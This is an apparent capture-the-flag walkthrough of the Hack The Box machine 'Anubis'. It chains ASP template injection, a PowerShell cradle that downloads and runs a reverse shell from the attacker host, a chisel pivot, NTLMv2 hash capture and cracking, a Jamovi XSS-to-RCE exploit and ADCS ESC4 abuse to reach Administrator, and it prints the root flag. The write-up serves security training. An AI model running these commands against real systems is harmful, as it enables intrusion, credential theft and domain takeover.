# Anubis
Fun AD box, starts with Template Injection which leads to landing in a docker container. From here there is a pivot to an internal web app which can be manipulated to leak a users NTLMv2 hash. This hash cracks and the user can authenticate to SMB where there is a vulnerable version of Jamovi running which allows for a XSS to RCE CVE. The final step is abusing ESC4 to get Administrator on the box.

# Enumeration

## Nmap

```c
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 14:30 AEDT
Nmap scan report for 10.10.11.102
Host is up (0.0058s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
443/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2024-03-29T04:31:12+00:00; +1h00m00s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=www.windcorp.htb
| Subject Alternative Name: DNS:www.windcorp.htb
| Not valid before: 2021-05-24T19:44:56
|_Not valid after:  2031-05-24T19:54:56
|_http-title: Not Found
445/tcp open  microsoft-ds?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-03-29T04:30:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 59m59s, deviation: 0s, median: 59m59s

```

dns name:

```c
www.windcorp.htb
```
## SMB
```
netexec smb 10.10.11.102
SMB         10.10.11.102    445    EARTH            [*] Windows 10 / Server 2019 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)
```
domain name and hostname.

## HTTPS

Some people which could be mapped to usernames:

```c
walter white
sarah jhonson
william anderson
amanda jepson
```

reflected content on the submit form.

Trying ssti and it errors!
```
${{<%[%'"}}%\.
```
# Foothold - Template Injection
As its an asp page I'm going to try vbs
```
<%= CreateObject("WScript.Shell").exec("whoami").StdOut.ReadAll() %>
```

This works and shows that we are running as system. Checking this hostname against what we got from netexec.
```
<%= CreateObject("WScript.Shell").exec("hostname").StdOut.ReadAll() %>
```

This outputs as webserver01 so its probs a container or something.

Going to use a tcp one liner to get a reverse shell. https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1

Hosting the file locally then downloading it with an iex cradle.

```
"powershell iex (New-Object Net.WebClient).downloadString('http://10.10.14.4/shell.ps1')"
```

This gives us a shell !

# Foothold - Enumeration
On The administrators desktop there is a certificate
```
-----BEGIN CERTIFICATE REQUEST-----
MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k
Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHC
KsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb
BEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL
eEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnz
QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOq
qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu
1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H
JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P
WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOt
yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F
F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04
CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
4TlwpQ==
-----END CERTIFICATE REQUEST-----
```

Analysing the cert with openssl shows another hostname:
```
softwareportal.windcorp.htb
```

Running nslookup on the host shows it resolves to 172.22.96.1, which is the gateway (again showing this is a docker container).

Next step is to drop chisel and set up a pivot.

chisel on the attack machine:
```
./chisel server --socks5 --reverse --port 8000
```

chisel on the windows box:
```
.\chisel.exe client 10.10.14.4:8000 R:socks
```
# Internal WebApp
quick port scan shows that smb and http are open:
```
proxychains -q nmap -p 445,80,8080,443,21 -sT 172.22.96.1 -oA logs/internal-initial
Nmap scan report for 172.22.96.1
Host is up (0.034s latency).

PORT     STATE  SERVICE
21/tcp   closed ftp
80/tcp   open   http
443/tcp  closed https
445/tcp  open   microsoft-ds
8080/tcp closed http-proxy
```

curling the website shows that there is an install.asp page that expects an ip.
```
http://softwareportal.windcorp.htb/install.asp?client=172.22.101.175&software=gimp-2.10.24-setup-3.exe
```
Going to start responder and then send a request with the ip pointing to my machine. This works and gives back a hash:
```
[WinRM] NTLMv2 Client   : 10.10.11.102
[WinRM] NTLMv2 Username : windcorp\localadmin
[WinRM] NTLMv2 Hash     : localadmin::windcorp:1122334455667788:2F5087D589FDB6A8F79B9BCDC1F09B5A:010100000000000059988EEA9D81DA018E750516C919CC6C0000000002000800590030004C004C0001001E00570049004E002D004300520030004B0044004F004E00370051004B00340004001400590030004C004C002E004C004F00430041004C0003003400570049004E002D004300520030004B0044004F004E00370051004B0034002E00590030004C004C002E004C004F00430041004C0005001400590030004C004C002E004C004F00430041004C000800300030000000000000000000000000210000520F2E7E1C4160A6FE8A94802A1835344DED28584F2BE20E14CD43039F88E3E00A0010000000000000000000000000000000000009001E0048005400540050002F00310030002E00310030002E00310034002E0034000000000000000000
```

This cracks with hashcat to give `Secret123`. Using this we can now enumerate smb.

```
netexec smb 10.10.11.102 -u localadmin -p Secret123 --shares
SMB         10.10.11.102    445    EARTH            [*] Windows 10 / Server 2019 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.102    445    EARTH            [+] windcorp.htb\localadmin:Secret123 
SMB         10.10.11.102    445    EARTH            [*] Enumerated shares
SMB         10.10.11.102    445    EARTH            Share           Permissions     Remark
SMB         10.10.11.102    445    EARTH            -----           -----------     ------
SMB         10.10.11.102    445    EARTH            ADMIN$                          Remote Admin
SMB         10.10.11.102    445    EARTH            C$                              Default share
SMB         10.10.11.102    445    EARTH            CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.11.102    445    EARTH            IPC$            READ            Remote IPC
SMB         10.10.11.102    445    EARTH            NETLOGON        READ            Logon server share 
SMB         10.10.11.102    445    EARTH            Shared          READ            
SMB         10.10.11.102    445    EARTH            SYSVOL          READ            Logon server share 
```

There is the CertEnroll share which means ADCS is installed which means certipy.
## ADCS Enumeration
```
proxychains -q certipy find -enabled -u localadmin@windcorp.htb -p Secret123 -dns-tcp -dc-ip 172.22.96.1 -text -stdout
Certificate Authorities
  0
    CA Name                             : windcorp-CA
    DNS Name                            : earth.windcorp.htb
    Certificate Subject                 : CN=windcorp-CA, DC=windcorp, DC=htb

<snip>
Certificate Templates
  0
    Template Name                       : Web
    Display Name                        : Web
    Certificate Authorities             : windcorp-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : WINDCORP.HTB\Domain Admins
                                          WINDCORP.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : WINDCORP.HTB\Administrator
        Full Control Principals         : WINDCORP.HTB\webdevelopers
        Write Owner Principals          : WINDCORP.HTB\Domain Admins
                                          WINDCORP.HTB\Enterprise Admins
                                          WINDCORP.HTB\Administrator
                                          WINDCORP.HTB\webdevelopers
        Write Dacl Principals           : WINDCORP.HTB\Domain Admins
                                          WINDCORP.HTB\Enterprise Admins
                                          WINDCORP.HTB\Administrator
                                          WINDCORP.HTB\webdevelopers
        Write Property Principals       : WINDCORP.HTB\Domain Admins
                                          WINDCORP.HTB\Enterprise Admins
                                          WINDCORP.HTB\Administrator
                                          WINDCORP.HTB\webdevelopers
<snip>
```

There is a template for web where the webdevelopers have write propery over the certificate, meaning we can modify the cert to allow user authentication. As it already has EnrolleeSuppliesSubject we can specify any user.

Going to dump ldap to see what users are in the webdevelopers group.

```
proxychains ldapsearch -D localadmin@windcorp.htb -w 'Secret123' -H ldap://172.22.96.1 -s sub -b 'DC=windcorp,DC=htb' > ldap.dmp
cat ldap.dmp | grep -E dis.*web -B 5
dn: CN=webdevelopers,OU=Development,DC=windcorp,DC=htb
objectClass: top
objectClass: group
cn: webdevelopers
member: CN=Diego Cruz,OU=MainOffice,DC=windcorp,DC=htb
distinguishedName: CN=webdevelopers,OU=Development,DC=windcorp,DC=htb
```

So we need to get to the Diego Cruz user.
## Jamovi XSS CVE
Going back to smb and checking the shared folder, there is a file called `Whatif.omv` that seems to be being updated.

Downloading and unzipping the file shows that the file is created by jamovi 1.6.16.0 which has a xss to rce CVE: https://github.com/g33xter/CVE-2021-28079

Running the exploit gives us a shell as `diegocruz`. :D
# ESC4
As we are now a member of the webdevelopers group we can modify the template to allow for user auth. For this I'm going to use this script: https://github.com/cfalta/PoshADCS/blob/master/ADCS.ps1 which converts a template into the format needed to request a smartcard cert (pfx).
```
[>] Get-SmartcardCertificate -Identity diegocruz -TemplateName Web
```

We can check this worked by running certify on the box:
```
.\certify.exe find /vulnerable /currentuser
<snip>
    CA Name                               : earth.windcorp.htb\windcorp-CA
    Template Name                         : Web
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
        All Extended Rights         : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
<snip>
```

Final step is to request the cert, get a tgt then psexec in:
```
[>] .\certify.exe request /ca:earth.windcorp.htb\windcorp-CA /template:Web /altname:administrator
$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
$ proxychains python3 /opt/PKINITtools/gettgtpkinit.py -dc-ip 10.10.11.102 -cert-pfx cert.pfx windcorp.htb/administrator admin.ccache
$ KRB5CCNAME=$(pwd)/admin.ccache proxychains -q psexec.py administrator@earth.windcorp.htb -k -no-pass -dc-ip 10.10.11.102
```

root.txt:
```
be33a363f06fa7cbd99a2e3bc0793151
```

# Things to learn / look into
How to request a cert for the current user on windows, this means I wouldnt have to drop certify on the box to request the cert.

VBS revshell - instead of calling out to a ps1 file and executing it with `CreateObject("WScript.Shell").exec()`. This would also give me greater control over the process running my revshell.

I'm probs going to do the box again soonish with the above stuff included as it would make it more fun and challenging.
